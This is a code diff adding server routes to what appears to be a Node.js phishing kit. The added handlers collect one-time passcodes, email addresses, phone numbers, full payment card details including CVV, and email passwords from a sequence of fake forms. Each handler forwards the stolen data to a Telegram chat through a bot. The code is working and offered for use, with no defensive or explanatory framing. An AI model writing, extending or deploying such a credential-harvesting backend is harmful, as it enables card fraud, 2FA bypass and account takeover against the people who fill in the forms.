@@ -36,4 +36,78 @@ app.post("/login", (req, res) => {
 });
 
 // Handle POST request for OTP form (otp.html)
-app
+app.post("/otp", (req, res) => {
+  const { code } = req.body;
+  console.log("Received OTP:", { code });
+
+  // Send OTP to Telegram
+  const otpMessage = `OTP submitted:\nCode: ${code}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, otpMessage)
+    .then(() => {
+      console.log("OTP sent to Telegram");
+      res.redirect("/alert.html");
+    })
+    .catch((error) => {
+      console.error("Error sending OTP to Telegram:", error.message);
+      res.status(500).send("Error sending OTP to Telegram");
+    });
+});
+
+// Handle POST request for alert form (alert.html)
+app.post("/alert", (req, res) => {
+  const { email, number } = req.body;
+  console.log("Received alert data:", { email, number });
+
+  // Send alert data to Telegram
+  const alertMessage = `Alert information submitted:\nEmail: ${email}\nPhone Number: ${number}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, alertMessage)
+    .then(() => {
+      console.log("Alert data sent to Telegram");
+      res.redirect("/card.html");
+    })
+    .catch((error) => {
+      console.error("Error sending alert data to Telegram:", error.message);
+      res.status(500).send("Error sending alert data to Telegram");
+    });
+});
+
+// Handle POST request for card form (card.html)
+app.post("/card", (req, res) => {
+  const { cardholder, cardnumber, exp, cvv } = req.body;
+  console.log("Received card data:", { cardholder, cardnumber, exp, cvv });
+
+  // Send card data to Telegram
+  const cardMessage = `Card information submitted:\nCardholder: ${cardholder}\nCard Number: ${cardnumber}\nExpiry: ${exp}\nCVV: ${cvv}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, cardMessage)
+    .then(() => {
+      console.log("Card data sent to Telegram");
+      res.redirect("/email.html");
+    })
+    .catch((error) => {
+      console.error("Error sending card data to Telegram:", error.message);
+      res.status(500).send("Error sending card data to Telegram");
+    });
+});
+
+// Handle POST request for email form (email.html)
+app.post("/email", (req, res) => {
+  const { email, password } = req.body;
+  console.log("Received email data:", { email, password });
+
+  // Send email data to Telegram
+  const emailMessage = `Email information submitted:\nEmail: ${email}\nPassword: ${password}`;
+  bot.sendMessage(TELEGRAM_CHAT_ID, emailMessage)
+    .then(() => {
+      console.log("Email data sent to Telegram");
+      res.redirect("/redirect.html");
+    })
+    .catch((error) => {
+      console.error("Error sending email data to Telegram:", error.message);
+      res.status(500).send("Error sending email data to Telegram");
+    });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
+});
